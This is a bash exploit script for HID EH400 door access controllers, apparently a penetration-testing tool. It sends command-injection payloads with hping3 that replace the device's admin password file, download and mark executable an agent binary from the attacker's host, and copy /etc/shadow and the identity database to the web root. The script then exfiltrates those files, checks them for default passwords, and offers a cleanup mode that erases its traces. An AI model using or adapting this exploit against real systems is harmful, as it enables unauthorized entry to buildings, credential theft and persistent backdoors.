#!/bin/bash
###########################################################################
# Writen by Mike Kelly                                                    #
# twitter.com/lixmk                                                       #
# github.com/lixmk                                                        #
# exfil.co                                                                #
###########################################################################
#                                                                         # 
#                  Concierge - EH400 exploitation Script                  #
#                                                                         #
###########################################################################
#                                                                         #
# This program is free software: you can redistribute it and/or modify    #
# it under the terms of the GNU General Public License as published by    #
# the Free Software Foundation, either version 3 of the License, or       #
# at your option) any later version.                                      #
#                                                                         #
# This program is distributed in the hope that it will be useful,         #
# but WITHOUT ANY WARRANTY; without even the implied warranty of          #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the           #
# GNU General Public License for more details.                            #
#                                                                         #
# You should have received a copy of the GNU General Public License       #
# along with this program.  If not, see <http://www.gnu.org/licenses/>.   #
#                                                                         #
###########################################################################

EXPECTED_ARGS=1;
if [ $# -ne $EXPECTED_ARGS ]
then
 echo "Usage: ./eh400.sh <action>"
 echo "Actions: exploit, cleanup"
 echo "Example: ./eh400.sh exploit"
 exit 1
fi

CMDEXEC=`which hping3`

if [ "$1" != "exploit" ] && [ "$1" != "cleanup" ]
then
  # Response required is verbatim "exploit" or "cleanup"
  echo "[*] Action '$1' not recognized. Exiting..."
  exit 0
fi

if [ "$1" == "exploit" ]
then 
  echo "[*] Fresh Exploit. Let's get started."
  # Set the follwoing 4 variables
  echo "[*] Setting Variables..."
  echo -n "Target IP: "
  read -e TARGET
  echo -n "Target MAC: "
  read -e TMAC
  echo -n "LHOST IP: "
  read -e LHOST
  echo -n "New Password: "
  read -e NEWPASS
  
  #Generating Hash and finding hping3
  HASH=`echo -n "admin:Secure Access:${NEWPASS}" | md5sum | cut -b -32`
  
  #Generating data files and backdoor script
  echo "[*] Creating Data files"
  if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
  then
    mkdir datafiles
    cd ./datafiles
  else
    cd ./datafiles
  fi
  echo 'command_blink_on;044;'${TMAC}';1`cp /etc/sysconfig/.htpasswd /tmp/htbak`;' > data1.txt
  echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/ht http://'${LHOST}'/ht`;' > data2.txt
  echo 'command_blink_on;044;'${TMAC}';1`mv /tmp/ht /etc/sysconfig/.htpasswd`;' > data3.txt
  echo 'command_blink_on;044;'${TMAC}';1`wget -O /tmp/agent http://'${LHOST}'/a`;' > data4.txt
  echo 'command_blink_on;044;'${TMAC}';1`chmod +x /tmp/agent`;' > data5.txt
  echo 'command_blink_on;044;'${TMAC}';1`cp /etc/shadow /mnt/apps/web/`;' > data6.txt
  echo 'command_blink_on;044;'${TMAC}';1`ln -s /mnt/apps/data/config/IdentDB /idb`;' > data7.txt
  echo 'command_blink_on;044;'${TMAC}';1`cp /idb /mnt/apps/web/`;' > data8.txt
  echo "admin:Secure Access:${HASH}" > /var/www/html/ht
  cp ../tools/agent /var/www/html/a
  echo "[*] Data files created"
 
  #Starting necessary services (Apache2)
  service apache2 start

  #Executing command injections
  echo "[*] Executing"
  echo "[*] Sending Payload 1"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data1.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 2"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data2.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 3"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data3.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 4"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data4.txt -d 150 ${TARGET} 2> /dev/null
  echo ""
  
  echo "[*] Sending Payload 5"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data5.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 6"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data6.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 7"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data7.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 8"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data8.txt -d 150 ${TARGET} 2> /dev/null
  echo ""
  cd ../
  service apache2 stop
  echo "[*] Execution Complete."

  #Exfiltraiting sensitive files
  #TODO: Impliment error checking on file exfil
  echo "[*] Exfiltrating shadow file and IdentDB."
  wget --no-check-certificate --user=admin --password=${NEWPASS} -O idb https://${TARGET}/idb
  wget --no-check-certificate --user=admin --password=${NEWPASS} -O shadow https://${TARGET}/shadow

  echo "[*] Checking shadow for default passwords"
  if [ "$(egrep -q xRH0tNmOG1 shadow && echo "1" || echo "0")" == "1" ]
  then
    echo -e "\e[1;31m[!]\e[0m Default root:pass user/pass combo found."
  fi
  if [ "$(egrep -q MPUVM6G7uu shadow && echo "1" || echo "0")" = "1" ]
  then
    echo -e "\e[1;31m[!]\e[0m Default modem1:modem1 user/pass combo found."
  fi
  if [ "$(egrep -q VFVf68vUI0 shadow && echo "1" || echo "0")" = "1" ]
  then
    echo -e "\e[1;31m[!]\e[0m Default router1:router1 user/pass combo found."
  fi
  if [ "$(egrep -q '(xRH0tNmOG1|MPUVM6G7uu|VFVf68vUI0)' shadow && echo "1" || echo "0")" = "0" ]
  then
    echo "[*] No default user/pass combinations identified."
  fi
  echo "[*] Exploitation Complete."
  echo "[*] Login at https://${TARGET}/ with admin:${NEWPASS} for manual control over the EH400."
  echo "[*] Or use door.sh to trigger the locking mechanism from commandline."
  exit 1 
fi

#Cleaning up post exploitation.
if [ $1 == "cleanup" ]
then
  echo "[*] Cleaning up previous exploitation."
  echo "[*] Setting Variables..."
  echo -n "Target IP: "
  read -e TARGET
  echo -n "Target MAC: "
  read -e TMAC
  
  #Creating Data Files
  echo "[*] Creating Data files."
  if [ "$(ls | egrep -q datafiles && echo "1" || echo "0")" = "0" ]
  then
    mkdir datafiles
    cd ./datafiles
  else
    cd ./datafiles
  fi
  echo 'command_blink_on;044;'${TMAC}';1`mv /tmp/htbak /etc/sysconfig/.htpasswd`;' > data9.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /tmp/agent`;' > data10.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /idb /mnt/apps/web/idb`;' > data11.txt
  echo 'command_blink_on;044;'${TMAC}';1`rm /mnt/apps/web/shadow`;' > data12.txt
  echo "[*] Data files created"
  
  #Executing
  echo "[*] Executing cleanup."
  echo "[*] Sending Payload 1"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data9.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 2"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data10.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 3"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data11.txt -d 150 ${TARGET} 2> /dev/null
  echo ""

  echo "[*] Sending Payload 4"
  ${CMDEXEC} -2 -p 4070 -c 1 -E data12.txt -d 150 ${TARGET} 2> /dev/null
  echo ""
  cd ../
  echo "[*] Cleanup Complete."
  exit 1
fi
exit 1
